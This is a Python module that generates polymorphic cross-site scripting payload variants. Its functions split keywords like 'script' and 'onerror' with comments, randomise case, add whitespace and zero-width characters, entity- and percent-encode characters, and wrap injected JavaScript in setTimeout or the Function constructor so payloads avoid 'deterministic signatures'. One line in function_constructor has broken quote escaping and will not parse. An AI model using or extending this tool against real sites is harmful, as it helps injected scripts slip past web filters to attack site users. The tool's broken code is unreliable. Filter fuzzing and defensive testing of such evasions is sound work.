import random
import re
from typing import Iterable

# Common whitespace variants (including non-ASCII)
WS = [" ", "\t", "\n", "\r", "\f", "\v", "\u00A0", "\u2009", "\u200A", "\u200B", "\u200C", "\u200D"]

HTML_COMMENTS = ["<!--x-->", "<!--0-->", "<!---->"]
JS_COMMENTS = ["/**/", "/*0*/", "//x\n"]

KEYWORDS = ["script", "onload", "onerror", "onclick", "onfocus", "onmouseover", "svg", "img", "iframe"]

def _rand(seq: Iterable[str]) -> str:
    seq = list(seq)
    return seq[random.randrange(len(seq))] if seq else ""

def case_shuffle(s: str, prob: float = 0.5) -> str:
    out = []
    for ch in s:
        if ch.isalpha() and random.random() < prob:
            out.append(ch.upper() if random.random() < 0.5 else ch.lower())
        else:
            out.append(ch)
    return "".join(out)

def insert_ws_noise(s: str, density: float = 0.15) -> str:
    out = []
    for ch in s:
        out.append(ch)
        if random.random() < density:
            out.append(_rand(WS))
    return "".join(out)

def insert_comment_noise(s: str, density: float = 0.2) -> str:
    # Try to inject comments between tokens and around keywords
    def repl_keyword(m):
        word = m.group(0)
        chars = list(word)
        out = []
        for c in chars:
            out.append(c)
            if random.random() < 0.35:
                out.append(_rand(HTML_COMMENTS + JS_COMMENTS))
        return "".join(out)
    # keyword split
    for kw in KEYWORDS:
        s = re.sub(kw, repl_keyword, s, flags=re.IGNORECASE)
    # general token spacing
    if random.random() < density:
        s = s.replace("=", _rand(JS_COMMENTS) + "=" + _rand(HTML_COMMENTS))
    return s

def html_entity_mangle(s: str, ratio: float = 0.25) -> str:
    # Randomly replace some sensitive chars with hex/dec entities
    mapping = {
        "<": ["&#60;", "&#x3c;"],
        ">": ["&#62;", "&#x3e;"],
        "\"": ["&#34;", "&#x22;"],
        "'": ["&#39;", "&#x27;"],
        "/": ["&#47;", "&#x2f;"],
        "=": ["&#61;", "&#x3d;"],
        "(": ["&#40;", "&#x28;"],
        ")": ["&#41;", "&#x29;"],
        ":": ["&#58;", "&#x3a;"],
    }
    out = []
    for ch in s:
        if ch in mapping and random.random() < ratio:
            out.append(_rand(mapping[ch]))
        else:
            out.append(ch)
    return "".join(out)

def url_mangle(s: str, ratio: float = 0.3) -> str:
    # Percent-encode selective chars; don't import urllib to keep it lightweight
    hexmap = {
        "<": "%3C", ">": "%3E", "\"": "%22", "'": "%27", " ": "%20", "#": "%23",
        "%": "%25", "{": "%7B", "}": "%7D", "|": "%7C", "\\": "%5C", "^": "%5E",
        "~": "%7E", "[": "%5B", "]": "%5D", ";": "%3B", "/": "%2F", "?": "%3F",
        ":": "%3A", "@": "%40", "=": "%3D", "&": "%26", "$": "%24", "+": "%2B", ",": "%2C"
    }
    out = []
    for ch in s:
        if ch in hexmap and random.random() < ratio:
            out.append(hexmap[ch])
        else:
            out.append(ch)
    return "".join(out)

def zero_width_sprinkle(s: str, ratio: float = 0.2) -> str:
    ZW = ["\u200B", "\u200C", "\u200D"]
    out = []
    for ch in s:
        out.append(ch)
        if ch.isalpha() and random.random() < ratio:
            out.append(_rand(ZW))
    return "".join(out)

def split_keywords(s: str) -> str:
    # Break sensitive tokens by concatenation-like patterns that browsers often accept in JS strings
    def breaker(m):
        w = m.group(0)
        if w.lower() == "script":
            return "scr" + _rand(JS_COMMENTS + HTML_COMMENTS) + "ipt"
        if w.lower() == "onerror":
            return "on" + _rand(JS_COMMENTS + HTML_COMMENTS) + "error"
        if w.lower() == "onload":
            return "on" + _rand(JS_COMMENTS + HTML_COMMENTS) + "load"
        return w[0:2] + _rand(JS_COMMENTS + HTML_COMMENTS) + w[2:]
    for kw in KEYWORDS:
        s = re.sub(kw, breaker, s, flags=re.IGNORECASE)
    return s

def wrap_in_settimeout(title_expr: str) -> str:
    # Return a JS expression that defers execution slightly
    return f"setTimeout(function(){{{title_expr}}},1)"

def function_constructor(title_expr: str) -> str:
    # Indirect eval via Function constructor
    code = title_expr.replace(\"'\", \"\\'\")
    return f"Function('{code}')()"

def compose_evasions(s: str, title_expr: str) -> str:
    # Pipeline of evasions; randomized to produce polymorphic variants
    variants = [s]
    # choose a subset randomly to avoid deterministic signatures
    funcs = [
        lambda x: case_shuffle(x, 0.6),
        lambda x: insert_ws_noise(x, 0.12),
        lambda x: insert_comment_noise(x, 0.15),
        lambda x: html_entity_mangle(x, 0.3),
        lambda x: url_mangle(x, 0.25),
        lambda x: zero_width_sprinkle(x, 0.15),
        lambda x: split_keywords(x),
    ]
    random.shuffle(funcs)
    for f in funcs[:random.randint(3, len(funcs))]:
        variants = [f(v) for v in variants]
    # Optionally wrap {JSCMD}
    if "{JSCMD}" in variants[0] and random.random() < 0.7:
        wrapped = _rand([wrap_in_settimeout(title_expr), function_constructor(title_expr)])
        variants = [v.replace("{JSCMD}", wrapped) for v in variants]
    return variants[0]
